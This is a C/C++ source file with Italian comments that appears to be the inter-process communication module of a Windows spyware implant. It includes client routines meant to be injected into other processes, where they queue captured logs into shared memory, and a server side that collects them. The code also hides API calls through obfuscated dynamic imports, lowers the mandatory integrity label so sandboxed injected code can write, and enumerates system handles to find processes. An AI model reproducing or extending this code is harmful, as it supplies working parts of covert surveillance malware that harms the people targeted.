#include <Windows.h>
#include "DynamiCall/dynamic_import.h"
#include "DynamiCall/obfuscated_calls.h"
#include "exceptions.h"
#include "common.h"
#include "H4-DLL.h"
#include "bss.h"
#include "HM_IpcModule.h"

#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS 0


// La memoria per la lettura e' composta da una serie di strutture che il server scrive e tutti i client
// possono leggere. La memoria per la scrittura implementa una coda di messaggi in cui i client scrivono
// e da cui il server legge.
// I client scrivono IPC_MESSAGE e leggono BYTE che poi loro casteranno.

// Valori base (modificabili a seconda delle esigenze)
#define MAX_MSG_LEN 0x400 // Lunghezza di un messaggio
#define MAX_MSG_NUM 3000 // Massimo numero di messaggi in coda
#define SHARE_MEMORY_READ_SIZE (WRAPPER_COUNT*WRAPPER_MAX_SHARED_MEM) // Dimensione spazio per la lettura delle configurazioni da parte dei wrapper                                

// Valori derivati
#define SHARE_MEMORY_WRITE_SIZE ((MAX_MSG_NUM * sizeof(IPC_MESSAGE))+2)


// Macro di supporto
#define DATA_SUPPORT DWORD dwFuncLen; DWORD dwFuncAdd; DWORD dwDataAdd;

#define INIT_SFUNC(STRTYPE)			STRTYPE *pData; \
									__asm    MOV EBX,69696969h \
									__asm	 MOV DWORD PTR SS:[pData], EBX \

#define MMCPY(DST, SRC, SIZ)		{ BYTE *lsrc = (BYTE *)SRC; \
									  BYTE *ldst = (BYTE *)DST; \
									  DWORD lsiz = (DWORD)SIZ; \
									__asm MOV ESI, lsrc \
									__asm MOV EDI, ldst \
									__asm MOV ECX, lsiz \
									__asm REP MOVSB }




extern BOOL IsVista(DWORD* integrity_level);
void* FindTokenObject(HANDLE Handle);

void* IPC_SHM_Kernel_Object = NULL;

//-------------------- FUNZIONI DA INIETTARE (Client) ----------------------
//////////////////////////
//						//
//    IPCClientRead     //
//						//
//////////////////////////
IPC_CLIENT_READ ipc_read;


// Ritorna l'indirizzo di memoria della configurazione di un dato wrapper
// Torna NULL se fallisce
BYTE* WINAPI IPCClientRead(DWORD wrapper_tag)
{
	INIT_SFUNC(IPC_CLIENT_READ);
	if (!pData->mem_addr)
		return NULL;

	return (pData->mem_addr + wrapper_tag);
}

DWORD IPCClientRead_setup(DWORD dummy)
{
	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_READ, FALSE, shared.SHARE_MEMORY_READ_NAME);
	ipc_read.mem_addr = 0;

	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
	// dalla memoria
	if (h_file)
		ipc_read.mem_addr = (BYTE*)FNC(MapViewOfFile)(h_file, FILE_MAP_READ, 0, 0, SHARE_MEMORY_READ_SIZE);

	ipc_read.dwHookLen = 150;
	return 0;
}

//////////////////////////
//						//
//    IPCClientWrite    //
//						//
//////////////////////////
IPC_CLIENT_WRITE ipc_write;

// Torna TRUE se ha scritto, FALSE se fallisce
BOOL WINAPI IPCClientWrite(DWORD wrapper_tag, BYTE* message, DWORD msg_len, DWORD flags, DWORD priority)
{
	unsigned int i, j;
	IPC_MESSAGE* pMessage;
	FILETIME time_stamp;
	INIT_SFUNC(IPC_CLIENT_WRITE);
	// Fallisce se la memoria non e' presente o se il messaggio e' troppo grosso
	// per essere scritto
	if (!pData->mem_addr || msg_len > MAX_MSG_LEN || !message)
		return FALSE;

	// La prima volta cerca una posizione libera.
	// Se non la trova, cerca una posizione occupata da una
	// priorita' minore
	for (j = 0; j < 2; j++) {
		for (i = 0, pMessage = pData->mem_addr; i < MAX_MSG_NUM; i++, pMessage++) {
			if (GET_STATUS(pMessage) == STATUS_FREE || (j && GET_STATUS(pMessage) == STATUS_WRIT && GET_PRIORITY(pMessage) < priority)) {
				// XXX Possibilita' di remota race condition sulla lettura dello status
				SET_STATUS(pMessage, STATUS_BUSY);
				pMessage->message_len = msg_len;
				SET_PRIORITY(pMessage, priority);
				pMessage->wrapper_tag = wrapper_tag;
				pMessage->flags = flags;

				// Setta il time stamp
				if (pData->pGetSystemTimeAsFileTime) {
					pData->pGetSystemTimeAsFileTime(&time_stamp);

					// Gestisce il caso di due log dello stesso tipo con timestamp uguali
					if (time_stamp.dwLowDateTime != pData->old_low_part ||
						time_stamp.dwHighDateTime != pData->old_hi_part) {
						pData->old_low_part = time_stamp.dwLowDateTime;
						pData->old_hi_part = time_stamp.dwHighDateTime;
						pData->increment = 0;
						pMessage->time_stamp.dwHighDateTime = time_stamp.dwHighDateTime;
						pMessage->time_stamp.dwLowDateTime = time_stamp.dwLowDateTime;
					}
					else {
						pData->increment++;
						pMessage->time_stamp.dwHighDateTime = time_stamp.dwHighDateTime;
						pMessage->time_stamp.dwLowDateTime = time_stamp.dwLowDateTime + pData->increment;
						// se c'e' riporto
						if (pMessage->time_stamp.dwLowDateTime < time_stamp.dwLowDateTime)
							pMessage->time_stamp.dwHighDateTime++;
					}


				}
				else {
					pMessage->time_stamp.dwHighDateTime = 0;
					pMessage->time_stamp.dwLowDateTime = 0;
				}

				TRY_BLOCK
					MMCPY(pMessage->message, message, msg_len);
				TRY_EXCEPT
					SET_STATUS(pMessage, STATUS_FREE);
				TRY_END

					if (GET_STATUS(pMessage) == STATUS_BUSY)
						SET_STATUS(pMessage, STATUS_WRIT);
				return TRUE;
			}
		}
	}

	// Se arriva qui, la coda e' DAVVERO piena e il messaggio viene droppato
	return FALSE;
}

DWORD IPCClientWrite_setup(DWORD dummy)
{
	HMODULE h_krn;
	HANDLE h_file;

	h_krn = GetModuleHandle("kernel32.dll");
	ipc_write.pGetSystemTimeAsFileTime = (GetSystemTimeAsFileTime_t)HM_SafeGetProcAddress(h_krn, (char*)"GetSystemTimeAsFileTime");

	h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_WRITE_NAME);
	ipc_write.mem_addr = 0;
	ipc_write.old_low_part = 0;
	ipc_write.old_hi_part = 0;
	ipc_write.increment = 0;

	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
	// dalla memoria
	if (h_file)
		ipc_write.mem_addr = (IPC_MESSAGE*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);

	ipc_write.dwHookLen = 800;
	return 0;
}


//-------------------- FUNZIONI per il Server ----------------------
IPC_MESSAGE* server_mem_addr_read = NULL;
BYTE* server_mem_addr_write = NULL;

void IPCServerWrite(DWORD wrapper_tag, BYTE* buff, DWORD size)
{
	if (server_mem_addr_write)
		memcpy(server_mem_addr_write + wrapper_tag, buff, size);
}

// Ritorna TRUE se tm1 e' piu' vecchio di tm2
BOOL is_older(FILETIME* tm1, FILETIME* tm2)
{
	if (tm1->dwHighDateTime < tm2->dwHighDateTime)
		return TRUE;
	if (tm1->dwHighDateTime > tm2->dwHighDateTime)
		return FALSE;
	if (tm1->dwLowDateTime < tm2->dwLowDateTime)
		return TRUE;
	return FALSE;
}

// Piu' veloce della Read, ritorna direttamente il messaggio nella shared memory (non fa la memcpy)
// Ma necessita che poi il messaggio sia rimosso a mano dopo che e' stato completato il dispatch
// Garantiesce l'ordinamento
IPC_MESSAGE* IPCServerPeek()
{
	unsigned int i;
	IPC_MESSAGE* pMessage, * oldest_msg = NULL;
	FILETIME oldest_time;

	if (!server_mem_addr_read)
		return NULL;

	// Setta il tempo del piu' vecchio al massimo possibile
	// cosi' il primo verra' preso
	oldest_time.dwHighDateTime = 0xFFFFFFFF;
	oldest_time.dwLowDateTime = 0xFFFFFFFF;
	for (i = 0, pMessage = server_mem_addr_read; i < MAX_MSG_NUM; i++, pMessage++) {
		if (GET_STATUS(pMessage) == STATUS_WRIT && is_older(&(pMessage->time_stamp), &oldest_time)) {
			oldest_msg = pMessage;
			oldest_time.dwHighDateTime = pMessage->time_stamp.dwHighDateTime;
			oldest_time.dwLowDateTime = pMessage->time_stamp.dwLowDateTime;
		}
	}

	// Ritrorna il messaggio piu' vecchio 
	// (NULL se non ce ne sono)
	return oldest_msg;
}


// Rimuove dalla coda un messaggio preso con IPCServerPeek
void IPCServerRemove(IPC_MESSAGE* msg)
{
	SET_STATUS(msg, STATUS_FREE);
}

// Se la shared memory gia' esiste ritorna FALSE
BOOL IPCServerInit()
{
	HANDLE h_file;
	SECURITY_ATTRIBUTES sec_attr;
	SECURITY_ATTRIBUTES* act_sec_attr = NULL;
	SECURITY_DESCRIPTOR sec_desc;
	PSECURITY_DESCRIPTOR pSD = NULL;
	DWORD dummy;
	PACL pSacl = NULL;
	BOOL fSaclPresent = FALSE;
	BOOL fSaclDefaulted = FALSE;
	BOOL ret_val = TRUE;

	do {
		if (!IsVista(&dummy))
			break;
		if (!FNC(InitializeSecurityDescriptor)(&sec_desc, SECURITY_DESCRIPTOR_REVISION))
			break;
		if (!FNC(SetSecurityDescriptorDacl)(&sec_desc, TRUE, NULL, FALSE))
			break;
		if (!FNC(ConvertStringSecurityDescriptorToSecurityDescriptorA)("S:(ML;;NW;;;LW)", SDDL_REVISION_1, &pSD, NULL))
			break;
		if (!FNC(GetSecurityDescriptorSacl)(pSD, &fSaclPresent, &pSacl, &fSaclDefaulted))
			break;
		if (!FNC(SetSecurityDescriptorSacl)(&sec_desc, TRUE, pSacl, FALSE))
			break;
		sec_attr.nLength = sizeof(SECURITY_ATTRIBUTES);
		sec_attr.bInheritHandle = FALSE;
		sec_attr.lpSecurityDescriptor = &sec_desc;
		act_sec_attr = &sec_attr;
	} while (0);

	// WRITE e READ sono invertiti perche' vengono visti dall'ottica del client
	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_READ_SIZE, shared.SHARE_MEMORY_READ_NAME);
	if (h_file) {
		server_mem_addr_write = (BYTE*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_READ_SIZE);
		IPC_SHM_Kernel_Object = FindTokenObject(h_file);
	}

	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_WRITE_SIZE, shared.SHARE_MEMORY_WRITE_NAME);
	if (h_file) {
		if (GetLastError() == ERROR_ALREADY_EXISTS)
			ret_val = FALSE;
		server_mem_addr_read = (IPC_MESSAGE*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
	}

	// Se esisteva gia' non ci deve scrivere
	if (ret_val) {
		if (server_mem_addr_read)
			memset(server_mem_addr_read, 0, SHARE_MEMORY_WRITE_SIZE);
		if (server_mem_addr_write)
			memset(server_mem_addr_write, 0, SHARE_MEMORY_READ_SIZE);
	}

	LocalFree(pSD);
	return ret_val;
}

typedef DWORD PROCESSINFOCLASS;
typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG  ProcessId;
	UCHAR  ObjectTypeNumber;
	UCHAR  Flags;
	USHORT Handle;
	PVOID  Object;
	ACCESS_MASK  GrantedAccess;
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
#define SystemHandleInformation 16
typedef DWORD(WINAPI* ZWQUERYSYSTEMINFORMATION)(
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);


static DWORD FindProcessHandle(DWORD dwPid, PVOID hHandle)
{
	static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
	
	if (ZwQuerySystemInformation == NULL) {
		HMODULE hNtdll = GetModuleHandle("ntdll.dll");
		ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
		if (!ZwQuerySystemInformation)
			return 0;
	}

	static DWORD* p = NULL;
	DWORD	n = 0x4000;
	LONG Status;
	PSYSTEM_HANDLE_INFORMATION hinfo;
	BOOL now_created = FALSE;

	if (p == NULL) {
		if (p == NULL) {
			if (!(p = (DWORD*)malloc(n)))
				return 0;

			while ((Status = ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH) {
				SAFE_FREE(p);
				n *= 4;
				if (!(p = (DWORD*)malloc(n)))
					return 0;
			}
			if (Status != STATUS_SUCCESS) {
				SAFE_FREE(p);
				return 0;
			}
			now_created = TRUE;
		}

		hinfo = PSYSTEM_HANDLE_INFORMATION(p + 1);
		for (DWORD i = 0; i < *p; i++) {
			if (hinfo[i].ProcessId == dwPid && hinfo[i].Object == hHandle) {
				return 1;
			}
		}

		if (now_created)
			return 0;

		SAFE_FREE(p);
	}

	return 1;
}

BOOL CheckIPCAlreadyExist(DWORD pid)
{
	if (IPC_SHM_Kernel_Object == NULL)
		return TRUE;

	for (int i = 0; i < 2; i++) {
		if (FindProcessHandle(pid, (PVOID) IPC_SHM_Kernel_Object))
			return TRUE;	
	}

	return FALSE;
}
